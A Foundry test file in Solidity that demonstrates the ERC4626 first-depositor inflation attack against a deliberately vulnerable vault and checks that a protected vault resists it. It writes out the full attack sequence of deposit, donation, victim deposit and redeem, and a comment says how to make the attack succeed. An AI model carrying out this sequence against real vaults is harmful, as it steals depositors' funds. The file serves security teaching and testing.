// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {UnderlyingERC20} from "../src/UnderlyingERC20.sol";
import {ERC4626NonVulnerable, IERC20} from "../src/ERC4626NV.sol";
import {ERC4626Vulnerable} from "../src/ERC4626V.sol";

contract ERC4626Test is Test {

    // Contract Instances
    ERC4626NonVulnerable nv;
    ERC4626Vulnerable v;
    UnderlyingERC20 underlyingERC20;

    // Actor addresses
    address public attacker = makeAddr("attacker");
    address public victim = makeAddr("victim");

    function setUp() public {
        underlyingERC20 = new UnderlyingERC20("MyToken", "MTK");
        nv = new ERC4626NonVulnerable("Non-Vulnerable", "NV", IERC20(underlyingERC20));
        v = new ERC4626Vulnerable("Vulnerable", "V", IERC20(underlyingERC20));

        // Let's assume owners of vault transfer assets to make the vault non-vulnerable
        underlyingERC20.mint(address(nv), 1000 * 1e18 + 1);

        // Mint 100 tokens + 1 wei to attacker to perform donation and deposit
        underlyingERC20.mint(attacker, 100 * 1e18 + 1);
        // Mint some initial tokens to victim to deposit
        underlyingERC20.mint(victim, 100 * 1e18);
    }

    // This should succeed since non vulnerable vault
    function testInflationAttackNotPossible1() public {
        // Attacker makes the first deposit
        vm.prank(attacker);
        underlyingERC20.approve(address(nv), 1);
        vm.prank(attacker);
        nv.deposit(1, attacker);

        // Attacker makes the donation
        vm.prank(attacker);
        underlyingERC20.transfer(address(nv), 100 * 1e18);
    

        // Victim makes their deposit
        vm.prank(victim);
        underlyingERC20.approve(address(nv), 100 * 1e18);
        vm.prank(victim);
        nv.deposit(100 * 1e18, victim);

        // Attacker withdraws the deposit
        vm.prank(attacker);
        vm.expectRevert();
        nv.redeem(1, attacker, attacker);
    }

    // This should fail since vulnerable vault
    function testInflationAttackNotPossible2() public {
         // Attacker makes the first deposit
        vm.prank(attacker);
        underlyingERC20.approve(address(v), 1);
        vm.prank(attacker);
        v.deposit(1, attacker);

        // Attacker makes the donation
        vm.prank(attacker);
        underlyingERC20.transfer(address(v), 100 * 1e18);
    
        // Victim makes their deposit
        vm.prank(victim);
        underlyingERC20.approve(address(v), 100 * 1e18);
        vm.prank(victim);
        v.deposit(100 * 1e18, victim);

        // Attacker withdraws the deposit
        vm.prank(attacker);
        vm.expectRevert(); // You can comment this out and uncomment below statement to see the attack
        v.redeem(1, attacker, attacker);

        //console2.log("Attacker balance: ", underlyingERC20.balanceOf(attacker));
    }
}